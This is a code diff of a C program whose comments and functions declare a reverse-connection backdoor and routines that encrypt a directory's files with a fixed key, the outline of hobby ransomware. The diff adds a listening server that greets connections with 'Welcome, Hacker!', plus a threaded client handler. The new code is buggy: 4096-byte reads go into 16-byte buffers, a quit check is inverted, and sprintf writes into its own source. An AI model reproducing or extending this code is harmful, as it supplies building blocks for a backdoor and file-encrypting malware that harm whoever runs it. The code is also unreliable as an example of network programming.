@@ -6,6 +6,7 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <netdb.h>
+#include<pthread.h>
 
 #define DEBUG
 
@@ -20,12 +21,22 @@
 #define trAssert_continue( cond )		{ if( !( cond ) ) continue; }
 #define trAssert( cond )			branch_CodeBegin if( !( cond ) ) return -1; branch_CodeEnd
 
-#define MAX_LEN (256)
+#define error_handling(message) { fputs(message, stderr); fputc('\n', stderr); exit(1);}
 
-char g_ip[MAX_LEN] = {0} ;
-int g_port = 0 ;
-char g_filepath[MAX_LEN] = {0} ;
-char g_key = 0 ;
+#define MAX_RECV (16)
+#define MAX_LEN (256)
+#define MAX_SIZE (4096)
+
+char g_ip[MAX_LEN] = {"127.0.0.1"} ;
+int g_port = 1234 ;
+int g_listenport = 1234 ;
+char g_filepath[MAX_LEN] = {"~/"} ;
+char g_key = 0x2b ;
+
+const char Welcome[] = "Welcome, Hacker!\r\n" ;
+
+// 开启监听服务
+int StartServer(void) ;
 
 // 反向连接后门
 int ReverseBackdoor(void) ;
@@ -36,13 +47,16 @@ int EncryptDirector(void) ;
 // 加密单个文件
 int Encrypt(char *path, char enkey) ;
 
+// 开始多线程的情况下处理函数
+static void DataHandle(void * sock_fd) ;   //Only can be seen in the file
+
 int main(int argc, char **argv)
 {
 #ifndef DEBUG
     int opt = 0 ;
     if(argc > 1)
     {
-        while(-1 != (opt = getopt(argc, argv,"a:p:f:k:")))
+        while(-1 != (opt = getopt(argc, argv,"a:p:f:k:l:")))
         {
             switch(opt)
             {
@@ -71,8 +85,67 @@ int main(int argc, char **argv)
 #endif
 
     //ReverseBackdoor() ;
-    EncryptDirector() ;
+    //EncryptDirector() ;
+    StartServer() ;
     
+    return 0 ;
+}
+
+
+// 开启监听服务
+int StartServer(void)
+{
+    int serv_sock = 0 ;
+    int clnt_sock = 0;
+
+    struct sockaddr_in serv_addr = {0};
+    struct sockaddr_in clnt_addr = {0};
+    socklen_t clnt_addr_size = 0;
+    char recv_buf[MAX_RECV] = {0} ;
+
+    serv_sock = socket(PF_INET, SOCK_STREAM, 0);
+    if(serv_sock == -1)
+        error_handling("StartServer socket() error");
+
+    serv_addr.sin_family=AF_INET;
+    serv_addr.sin_addr.s_addr=htonl(INADDR_ANY);
+    serv_addr.sin_port=htons(g_listenport);
+
+    if(bind(serv_sock, (struct sockaddr*) &serv_addr, sizeof(serv_addr))==-1)
+        error_handling("StartServer bind() error"); 
+
+    if(listen(serv_sock, 5)==-1)
+        error_handling("StartServer listen() error");
+
+    printf("Server Start !\n");
+
+    while(1)
+    {
+        pthread_t thread_id ;
+        clnt_addr_size=sizeof(clnt_addr);  
+        clnt_sock=accept(serv_sock, (struct sockaddr*)&clnt_addr,&clnt_addr_size);
+        if(clnt_sock==-1)
+            error_handling("accept() error");  
+
+        write(clnt_sock, Welcome, sizeof(Welcome));
+#ifdef MULIT_THREAD
+        if(pthread_create(&thread_id,NULL,(void *)(&DataHandle),(void *)(&clnt_sock)) == -1)
+        {
+            fprintf(stderr,"pthread_create error!\n");
+            break;                                  //break while loop
+        }
+#else
+        read(clnt_sock, recv_buf, MAX_SIZE) ;
+        puts(recv_buf) ;
+        close(clnt_sock) ;
+#endif
+    }
+
+    close(serv_sock);
+
+    shutdown(serv_sock, SHUT_WR) ;
+    printf("Server shuts down\n");
+
     return 0 ;
 }
 
@@ -189,4 +262,48 @@ int Encrypt(char *path, char enkey)
     fclose(infile) ;
     fclose(outfile) ;
     return 0;
+}
+
+void DataHandle(void * sock_fd)
+{
+    int fd = *((int *)sock_fd);
+    int i_recvBytes;
+    char data_recv[MAX_RECV];
+    const char * data_send = "Server has received your request!\n";
+
+    while(1)
+    {
+        printf("waiting for request...\n");
+        //Reset data.
+        memset(data_recv,0,MAX_LEN);
+
+        i_recvBytes = read(fd,data_recv,MAX_SIZE);
+        if(i_recvBytes == 0)
+        {
+            printf("Maybe the client has closed\n");
+            break;
+        }
+        if(i_recvBytes == -1)
+        {
+            fprintf(stderr,"read error!\n");
+            break;
+        }
+        if(strcmp(data_recv,"quit")== 0 || strcmp(data_recv, "exit"))
+        {
+            printf("Quit command!\n");
+            break;                           //Break the while loop.
+        }
+        printf("read from client : %s\n",data_recv);
+        sprintf(data_recv, "Reply: %s", data_recv) ;
+        if(write(fd,data_send,strlen(data_send)) == -1)
+        {
+            break;
+        }
+    }
+
+    //Clear
+    printf("terminating current client_connection...\n");
+    close(fd);            //close a file descriptor.
+    pthread_exit(NULL);   //terminate calling thread!
+    return ;
 }
